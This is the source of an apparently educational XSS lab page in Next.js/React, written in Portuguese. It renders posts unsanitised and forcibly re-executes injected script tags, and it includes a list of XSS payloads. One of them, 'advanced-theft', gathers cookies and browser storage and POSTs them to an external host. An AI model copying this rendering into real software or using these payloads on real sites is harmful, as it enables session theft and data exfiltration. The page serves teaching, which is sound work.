"use client";

import { useState, useEffect } from "react";
import Link from "next/link";

export default function Posts() {
  const [posts, setPosts] = useState<any[]>([]);
  const [newPost, setNewPost] = useState({ title: "", content: "" });
  const [isLoading, setIsLoading] = useState(false);
  const [selectedExample, setSelectedExample] = useState<string | null>(null);
  const [showExplanation, setShowExplanation] = useState(false);
  const [safeMode, setSafeMode] = useState(false);
  const [error, setError] = useState<string | null>(null);

  useEffect(() => {
    fetchPosts();
  }, []);

  const fetchPosts = async () => {
    try {
      setError(null);
      const response = await fetch("/api/posts");
      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }
      const data = await response.json();
      console.log("Posts fetched:", data);
      setPosts(Array.isArray(data) ? data : []);
    } catch (error) {
      console.error("Erro ao buscar posts:", error);
      setError("Erro ao carregar posts. Verifique se o servidor está rodando.");
      setPosts([]);
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!newPost.title.trim() || !newPost.content.trim()) {
      alert("Por favor, preencha título e conteúdo!");
      return;
    }

    setIsLoading(true);
    try {
      const response = await fetch("/api/posts", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(newPost),
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      const createdPost = await response.json();
      console.log("Post criado:", createdPost);

      // Executa JavaScript se o conteúdo contém scripts
      if (
        newPost.content.includes("<script>") ||
        newPost.content.includes("onerror=") ||
        newPost.content.includes("onclick=") ||
        newPost.content.includes("onmouseover=") ||
        newPost.content.includes("onmouseout=")
      ) {
        // Simula execução de XSS para demonstração
        setTimeout(() => {
          if (
            newPost.content.includes("XSS") ||
            newPost.content.includes("alert") ||
            newPost.content.includes("redirecionamento") ||
            newPost.content.includes("mudança")
          ) {
            alert(
              "🚨 XSS EXECUTADO! Este é um exemplo educacional de como o XSS funciona!"
            );
          }
        }, 500);
      }

      await fetchPosts();
      setNewPost({ title: "", content: "" });
      setSelectedExample(null);
      setShowExplanation(false);
    } catch (error) {
      console.error("Erro ao criar post:", error);
      alert("Erro ao criar post. Verifique o console para mais detalhes.");
    } finally {
      setIsLoading(false);
    }
  };

  const resetPosts = async () => {
    if (!confirm("Tem certeza que deseja deletar todos os posts?")) {
      return;
    }

    setIsLoading(true);
    try {
      const response = await fetch("/api/posts", {
        method: "DELETE",
      });

      if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status}`);
      }

      setPosts([]);
      await fetchPosts();
      console.log("Posts resetados com sucesso");
    } catch (error) {
      console.error("Erro ao resetar posts:", error);
      alert("Erro ao resetar posts. Verifique o console para mais detalhes.");
    } finally {
      setIsLoading(false);
    }
  };

  const loadXSSExample = (example: any) => {
    setNewPost({ title: example.title, content: example.code });
    setSelectedExample(example.id);
    setShowExplanation(true);
  };

  const clearForm = () => {
    setNewPost({ title: "", content: "" });
    setSelectedExample(null);
    setShowExplanation(false);
  };

  const emergencyStop = () => {
    setPosts([]);
    window.location.reload();
  };

  const xssExamples = [
    {
      id: "basic-alert",
      name: "🚨 Alert Básico",
      title: "XSS Básico",
      code: `<img src="x" onerror="alert('🚨 XSS Detectado! Este é um exemplo educacional!')">`,
      description:
        "O exemplo mais simples de XSS - executa um alerta JavaScript via imagem",
      difficulty: "Iniciante",
      impact: "Baixo - apenas mostra um alerta",
    },
    {
      id: "style-change",
      name: "🎨 Mudança de Estilo",
      title: "XSS com Mudança Visual",
      code: `<div onmouseover="this.style.backgroundColor='red'; this.style.color='white'; alert('🎨 Página comprometida! Cores alteradas via XSS!')" onmouseout="this.style.backgroundColor='yellow'; this.style.color='black';" style="background: yellow; padding: 20px; border: 2px solid black; cursor: pointer; transition: all 0.3s;">Passe o mouse aqui para ver a mudança de cor e o alerta!</div>`,
      description: "Altera a aparência da página e executa código malicioso",
      difficulty: "Iniciante",
      impact: "Médio - modifica a interface",
    },
    {
      id: "image-xss",
      name: "🖼️ XSS via Imagem",
      title: "XSS com Imagem",
      code: `<img src="imagem-inexistente.jpg" onerror="alert('🖼️ XSS via Imagem! Bypass de filtros básicos!'); document.body.style.border='5px solid red';" style="width: 200px; height: 100px; border: 2px dashed #ccc; display: block; margin: 10px 0;"><p style="color: red; font-weight: bold;">Esta imagem não existe, mas executou XSS!</p>`,
      description:
        "Usa o evento onerror de uma imagem para executar JavaScript",
      difficulty: "Intermediário",
      impact: "Médio - bypass de filtros básicos",
    },
    {
      id: "redirect",
      name: "🔄 Redirecionamento",
      title: "XSS com Redirecionamento",
      code: `<div onclick="alert('🔄 Redirecionamento XSS! Você será redirecionado em 3 segundos...'); setTimeout(() => { if(confirm('Deseja continuar para o Google? (Este é um exemplo educacional)')) { window.open('https://google.com', '_blank'); } }, 3000);" style="background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; padding: 20px; border-radius: 10px; cursor: pointer; text-align: center; font-weight: bold; box-shadow: 0 4px 8px rgba(0,0,0,0.3);">🔄 Clique aqui para ver o redirecionamento XSS!</div>`,
      description: "Redireciona o usuário para outro site após confirmação",
      difficulty: "Intermediário",
      impact: "Alto - pode levar a phishing",
    },
    {
      id: "hover-xss",
      name: "🖱️ XSS no Hover",
      title: "XSS com Evento Hover",
      code: `<div onmouseover="alert('XSS no hover!')" style="background: yellow; padding: 10px; cursor: pointer;">Passe o mouse aqui</div>`,
      description:
        "Executa código quando o usuário passa o mouse sobre o elemento",
      difficulty: "Intermediário",
      impact: "Médio - execução por interação",
    },
    {
      id: "click-xss",
      name: "👆 XSS no Click",
      title: "XSS com Evento Click",
      code: `<button onclick="alert('🚨 XSS no click! Este é um exemplo educacional!')" style="background: red; color: white; padding: 10px; border: none; cursor: pointer; border-radius: 5px;">Clique aqui para ver XSS</button>`,
      description: "Executa código quando o usuário clica no botão",
      difficulty: "Iniciante",
      impact: "Médio - execução por interação",
    },
    {
      id: "auto-execute",
      name: "⚡ Execução Automática",
      title: "XSS com Execução Imediata",
      code: `<img src="x" onerror="alert('🚨 XSS Executado Automaticamente! Este é um exemplo educacional!')" style="display: none;"><div style="background: yellow; padding: 10px; border: 2px solid red; border-radius: 5px;">Este elemento executa XSS automaticamente quando carregado!</div>`,
      description:
        "Executa JavaScript automaticamente quando o elemento é carregado",
      difficulty: "Iniciante",
      impact: "Alto - execução automática sem interação",
    },
    {
      id: "safe-html",
      name: "✅ HTML Seguro",
      title: "HTML Seguro",
      code: `<p style="color: red; font-weight: bold;">Este é apenas texto HTML simples e seguro</p>`,
      description: "Exemplo de HTML que não contém JavaScript malicioso",
      difficulty: "Iniciante",
      impact: "Nenhum - apenas formatação",
    },
    {
      id: "link-xss",
      name: "🔗 XSS via Link",
      title: "XSS com Link JavaScript",
      code: `<a href="javascript:alert('XSS via Link!')" style="color: blue; text-decoration: underline;">Clique neste link</a>`,
      description: "Usa o protocolo javascript: em links para executar código",
      difficulty: "Intermediário",
      impact: "Médio - execução por interação",
    },
    {
      id: "advanced-theft",
      name: "💎 Roubo de Dados Avançado",
      title: "XSS com Roubo de Informações",
      code: `<script>
// Simula roubo de dados sensíveis
const stolenData = {
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  userAgent: navigator.userAgent,
  url: window.location.href,
  timestamp: new Date().toISOString()
};

// Simula envio para servidor malicioso
fetch('https://httpbin.org/post', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({stolen: stolenData})
}).then(() => {
  alert('🚨 DADOS ROUBADOS!\\n\\nCookies: ' + document.cookie.substring(0,50) + '...\\n\\nEste é um exemplo educacional!');
});

// Também mostra os dados na tela
document.body.innerHTML += '<div style="background:red;color:white;padding:20px;margin:10px;border-radius:10px;"><h3>🚨 DADOS ROUBADOS (SIMULAÇÃO):</h3><pre>' + JSON.stringify(stolenData, null, 2) + '</pre></div>';
</script>`,
      description:
        "Demonstra como XSS pode ser usado para roubar dados sensíveis do usuário e enviá-los para servidores maliciosos",
      difficulty: "Avançado",
      impact: "CRÍTICO - roubo de dados pessoais e sessões",
    },
  ];

  return (
    <div className="min-h-screen bg-gradient-to-br from-orange-50 to-red-50">
      <div className="container mx-auto px-4 py-8">
        {/* Header */}
        <div className="text-center mb-8">
          <h1 className="text-5xl font-bold text-gray-800 mb-4">
            🌐 Laboratório de XSS
          </h1>
          <p className="text-xl text-gray-600 max-w-3xl mx-auto">
            Aprenda sobre Cross-Site Scripting (XSS) através de demonstrações
            interativas e seguras
          </p>
        </div>

        {/* Navigation */}
        <div className="flex justify-between items-center mb-8">
          <Link
            href="/ataques"
            className="inline-flex items-center space-x-2 bg-gray-800 text-white px-4 py-2 rounded-lg font-semibold hover:bg-gray-700 transition-colors duration-200"
          >
            <span>←</span>
            <span>Voltar aos Ataques</span>
          </Link>

          <div className="flex gap-3">
            <button
              onClick={emergencyStop}
              className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg font-medium animate-pulse shadow-lg"
            >
              🚨 PARAR ALERTS
            </button>
            <button
              onClick={resetPosts}
              disabled={isLoading}
              className="bg-red-500 hover:bg-red-600 disabled:bg-gray-400 text-white px-4 py-2 rounded-lg font-medium shadow-lg"
            >
              {isLoading ? "Carregando..." : "🗑️ Resetar Posts"}
            </button>
          </div>
        </div>

        {/* Error Banner */}
        {error && (
          <div className="mb-8 p-6 bg-gradient-to-r from-red-100 to-red-200 border-2 border-red-400 rounded-2xl shadow-lg">
            <div className="flex items-start space-x-4">
              <div className="text-4xl">❌</div>
              <div>
                <h3 className="text-2xl font-bold text-red-800 mb-3">
                  Erro de Conexão
                </h3>
                <p className="text-red-700 mb-4">{error}</p>
                <button
                  onClick={fetchPosts}
                  className="bg-red-600 hover:bg-red-700 text-white px-4 py-2 rounded-lg font-semibold"
                >
                  🔄 Tentar Novamente
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Warning Banner */}
        <div className="mb-8 p-6 bg-gradient-to-r from-red-100 to-orange-100 border-2 border-red-300 rounded-2xl shadow-lg">
          <div className="flex items-start space-x-4">
            <div className="text-4xl">⚠️</div>
            <div>
              <h3 className="text-2xl font-bold text-red-800 mb-3">
                Demonstração de Vulnerabilidade XSS
              </h3>
              <div className="space-y-2 text-red-700">
                <p>
                  • Esta página demonstra vulnerabilidades XSS{" "}
                  <strong>REAIS</strong>
                </p>
                <p>
                  • Os exemplos contêm código JavaScript que será executado no
                  seu navegador
                </p>
                <p>
                  • <strong>Use apenas para fins educacionais!</strong>
                </p>
                <p>
                  • <strong>Como testar:</strong> Clique em um exemplo → Clique
                  em "Criar Post" → Veja o alerta!
                </p>
                <p>
                  • Se algo der errado, use o botão "PARAR ALERTS" ou recarregue
                  a página
                </p>
              </div>
            </div>
          </div>
        </div>

        {/* XSS Examples Section */}
        <div className="mb-8">
          <h2 className="text-3xl font-bold text-gray-800 mb-6 text-center">
            🎯 Exemplos de XSS para Testar
          </h2>

          <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
            {xssExamples.map((example) => (
              <div
                key={example.id}
                className={`p-4 rounded-xl border-2 cursor-pointer transition-all duration-200 hover:shadow-lg ${
                  selectedExample === example.id
                    ? "border-blue-500 bg-blue-50 shadow-lg"
                    : "border-gray-200 bg-white hover:border-gray-300"
                }`}
                onClick={() => loadXSSExample(example)}
              >
                <div className="text-center">
                  <div className="text-2xl mb-2">
                    {example.name.split(" ")[0]}
                  </div>
                  <h3 className="font-bold text-gray-800 mb-2 text-sm">
                    {example.name.split(" ").slice(1).join(" ")}
                  </h3>
                  <div className="space-y-1">
                    <span
                      className={`inline-block px-2 py-1 rounded-full text-xs font-medium ${
                        example.difficulty === "Iniciante"
                          ? "bg-green-100 text-green-800"
                          : example.difficulty === "Intermediário"
                          ? "bg-yellow-100 text-yellow-800"
                          : example.difficulty === "Avançado"
                          ? "bg-red-100 text-red-800"
                          : "bg-purple-100 text-purple-800"
                      }`}
                    >
                      {example.difficulty}
                    </span>
                    <div className="text-xs text-gray-600">
                      Impacto: {example.impact}
                    </div>
                  </div>
                </div>
              </div>
            ))}
          </div>

          {/* Selected Example Details */}
          {selectedExample && showExplanation && (
            <div className="bg-white rounded-2xl shadow-lg p-6 mb-6 border-2 border-blue-200">
              <h3 className="text-xl font-bold text-gray-800 mb-4">
                📖 Explicação do Exemplo Selecionado
              </h3>
              {(() => {
                const example = xssExamples.find(
                  (e) => e.id === selectedExample
                );
                return example ? (
                  <div className="space-y-4">
                    <div>
                      <h4 className="font-bold text-gray-700 mb-2">
                        Descrição:
                      </h4>
                      <p className="text-gray-600">{example.description}</p>
                    </div>
                    <div>
                      <h4 className="font-bold text-gray-700 mb-2">
                        Código Malicioso:
                      </h4>
                      <code className="bg-gray-100 p-3 rounded-lg text-sm block font-mono break-all">
                        {example.code}
                      </code>
                    </div>
                    <div className="flex gap-4">
                      <div>
                        <span className="font-bold text-gray-700">
                          Dificuldade:
                        </span>
                        <span
                          className={`ml-2 px-2 py-1 rounded-full text-xs font-medium ${
                            example.difficulty === "Iniciante"
                              ? "bg-green-100 text-green-800"
                              : example.difficulty === "Intermediário"
                              ? "bg-yellow-100 text-yellow-800"
                              : example.difficulty === "Avançado"
                              ? "bg-red-100 text-red-800"
                              : "bg-purple-100 text-purple-800"
                          }`}
                        >
                          {example.difficulty}
                        </span>
                      </div>
                      <div>
                        <span className="font-bold text-gray-700">
                          Impacto:
                        </span>
                        <span className="ml-2 text-gray-600">
                          {example.impact}
                        </span>
                      </div>
                    </div>
                  </div>
                ) : null;
              })()}
            </div>
          )}
        </div>

        {/* Quick Test Section */}
        <div className="bg-gradient-to-r from-green-50 to-blue-50 rounded-2xl shadow-lg p-6 mb-8 border-2 border-green-200">
          <h3 className="text-2xl font-bold text-green-800 mb-4 text-center">
            🚀 Teste Rápido de XSS
          </h3>
          <p className="text-green-700 text-center mb-4">
            Teste os 3 tipos principais de XSS:
          </p>
          <div className="grid md:grid-cols-3 gap-4">
            <button
              onClick={() => {
                setNewPost({
                  title: "Teste - Mudança de Estilo",
                  content: `<div onmouseover="this.style.backgroundColor='red'; this.style.color='white'; alert('🎨 XSS Mudança de Estilo!')" onmouseout="this.style.backgroundColor='yellow'; this.style.color='black';" style="background: yellow; padding: 20px; border: 2px solid black; cursor: pointer;">Passe o mouse aqui!</div>`,
                });
                setSelectedExample("test-style");
              }}
              className="bg-yellow-500 hover:bg-yellow-600 text-white px-4 py-3 rounded-xl font-semibold shadow-lg hover:shadow-xl transition-all duration-200"
            >
              🎨 Teste Mudança de Estilo
            </button>

            <button
              onClick={() => {
                setNewPost({
                  title: "Teste - XSS via Imagem",
                  content: `<img src="imagem-inexistente.jpg" onerror="alert('🖼️ XSS via Imagem!'); document.body.style.border='5px solid red';" style="width: 200px; height: 100px; border: 2px dashed #ccc; display: block; margin: 10px 0;"><p style="color: red; font-weight: bold;">Imagem com erro executou XSS!</p>`,
                });
                setSelectedExample("test-image");
              }}
              className="bg-blue-500 hover:bg-blue-600 text-white px-4 py-3 rounded-xl font-semibold shadow-lg hover:shadow-xl transition-all duration-200"
            >
              🖼️ Teste XSS via Imagem
            </button>

            <button
              onClick={() => {
                setNewPost({
                  title: "Teste - Redirecionamento",
                  content: `<div onclick="alert('🔄 XSS Redirecionamento!'); setTimeout(() => { if(confirm('Continuar para Google? (Exemplo educacional)')) { window.open('https://google.com', '_blank'); } }, 2000);" style="background: linear-gradient(45deg, #ff6b6b, #4ecdc4); color: white; padding: 20px; border-radius: 10px; cursor: pointer; text-align: center; font-weight: bold;">Clique para redirecionamento XSS!</div>`,
                });
                setSelectedExample("test-redirect");
              }}
              className="bg-red-500 hover:bg-red-600 text-white px-4 py-3 rounded-xl font-semibold shadow-lg hover:shadow-xl transition-all duration-200"
            >
              🔄 Teste Redirecionamento
            </button>
          </div>
        </div>

        {/* Form Section */}
        <div className="bg-white rounded-2xl shadow-lg p-8 mb-8">
          <h2 className="text-3xl font-bold text-gray-800 mb-6 text-center">
            📝 Criar Post para Testar XSS
          </h2>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div>
              <label className="block text-lg font-semibold text-gray-700 mb-2">
                Título do Post
              </label>
              <input
                type="text"
                placeholder="Digite o título do post"
                value={newPost.title}
                onChange={(e) =>
                  setNewPost({ ...newPost, title: e.target.value })
                }
                className="w-full p-4 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 text-lg"
              />
            </div>

            <div>
              <label className="block text-lg font-semibold text-gray-700 mb-2">
                Conteúdo do Post
                <span className="text-red-600 ml-2">⚠️ Vulnerável a XSS</span>
              </label>
              <textarea
                placeholder="Digite o conteúdo do post (pode conter HTML/JavaScript malicioso)"
                value={newPost.content}
                onChange={(e) =>
                  setNewPost({ ...newPost, content: e.target.value })
                }
                className="w-full p-4 border-2 border-gray-300 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-blue-500 h-32 text-lg"
              />
              <p className="text-sm text-gray-500 mt-2">
                💡 Dica: Use os exemplos acima ou digite seu próprio código
                HTML/JavaScript
              </p>
            </div>

            <div className="flex gap-4 justify-center">
              <button
                type="submit"
                disabled={isLoading}
                className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-400 text-white px-8 py-3 rounded-xl font-semibold text-lg shadow-lg hover:shadow-xl transition-all duration-200"
              >
                {isLoading ? "⏳ Criando..." : "🚀 Criar Post"}
              </button>
              <button
                type="button"
                onClick={clearForm}
                className="bg-gray-500 hover:bg-gray-600 text-white px-6 py-3 rounded-xl font-semibold text-lg shadow-lg hover:shadow-xl transition-all duration-200"
              >
                🗑️ Limpar
              </button>
            </div>
          </form>
        </div>

        {/* Posts Display Section */}
        <div className="bg-white rounded-2xl shadow-lg p-8">
          <div className="flex justify-between items-center mb-6">
            <h2 className="text-3xl font-bold text-gray-800">
              📋 Posts Existentes ({posts.length})
            </h2>
            {isLoading && (
              <div className="flex items-center space-x-2 text-blue-600">
                <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-blue-600"></div>
                <span>Carregando...</span>
              </div>
            )}
          </div>

          {posts.length === 0 && !isLoading ? (
            <div className="text-center py-12">
              <div className="text-6xl mb-4">📝</div>
              <h3 className="text-xl font-semibold text-gray-600 mb-2">
                Nenhum post encontrado
              </h3>
              <p className="text-gray-500">
                Crie um novo post usando os exemplos acima para testar XSS!
              </p>
            </div>
          ) : posts.length > 0 ? (
            <div className="space-y-6">
              {posts.map((post, index) => (
                <div
                  key={post.id}
                  className="border-2 border-gray-200 p-6 rounded-xl bg-gradient-to-r from-gray-50 to-white shadow-lg hover:shadow-xl transition-all duration-200"
                >
                  <div className="flex justify-between items-start mb-4">
                    <h3 className="text-2xl font-bold text-gray-800">
                      {post.title}
                    </h3>
                    <div className="text-sm text-gray-500 bg-gray-100 px-3 py-1 rounded-full">
                      Post #{index + 1}
                    </div>
                  </div>

                  <div className="text-sm text-gray-600 mb-4 flex items-center space-x-4">
                    <span>👤 Por: {post.author?.name || "Usuário"}</span>
                    <span>🕒 {new Date(post.createdAt).toLocaleString()}</span>
                  </div>

                  <div className="border-t-2 border-gray-200 pt-4">
                    <div className="flex items-center space-x-2 mb-3">
                      <span className="text-sm font-semibold text-red-600">
                        ⚠️ Conteúdo Vulnerável:
                      </span>
                      <span className="text-sm text-gray-500">
                        (renderizado com dangerouslySetInnerHTML)
                      </span>
                    </div>

                    {/* Vulnerabilidade XSS: Renderizando HTML não sanitizado */}
                    <div
                      className="p-4 bg-red-50 rounded-lg border-l-4 border-red-400 min-h-[60px]"
                      dangerouslySetInnerHTML={{ __html: post.content }}
                      ref={(el) => {
                        if (el) {
                          // Executa scripts que podem não ter sido executados pelo dangerouslySetInnerHTML
                          const scripts = el.querySelectorAll("script");
                          scripts.forEach((script) => {
                            const newScript = document.createElement("script");
                            newScript.textContent = script.textContent;
                            document.head.appendChild(newScript);
                            document.head.removeChild(newScript);
                          });
                        }
                      }}
                    />

                    <div className="mt-3 p-3 bg-yellow-50 rounded-lg border border-yellow-200">
                      <p className="text-sm text-yellow-800">
                        <strong>🔍 O que está acontecendo:</strong> O conteúdo
                        acima é renderizado diretamente no DOM sem sanitização,
                        permitindo que qualquer JavaScript seja executado no
                        navegador do usuário.
                      </p>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          ) : null}
        </div>

        {/* Educational Footer */}
        <div className="mt-8 bg-gradient-to-r from-blue-50 to-indigo-50 rounded-2xl p-6 border-2 border-blue-200">
          <h3 className="text-2xl font-bold text-blue-800 mb-4 text-center">
            🎓 Como Prevenir XSS
          </h3>
          <div className="grid md:grid-cols-3 gap-6">
            <div className="text-center">
              <div className="text-3xl mb-2">🧹</div>
              <h4 className="font-bold text-blue-700 mb-2">Sanitização</h4>
              <p className="text-blue-600 text-sm">
                Sempre sanitize dados de entrada removendo ou escapando
                caracteres perigosos
              </p>
            </div>
            <div className="text-center">
              <div className="text-3xl mb-2">🛡️</div>
              <h4 className="font-bold text-blue-700 mb-2">Validação</h4>
              <p className="text-blue-600 text-sm">
                Valide e filtre todos os dados antes de processá-los ou
                exibi-los
              </p>
            </div>
            <div className="text-center">
              <div className="text-3xl mb-2">📋</div>
              <h4 className="font-bold text-blue-700 mb-2">CSP</h4>
              <p className="text-blue-600 text-sm">
                Use Content Security Policy para restringir fontes de script
                executáveis
              </p>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
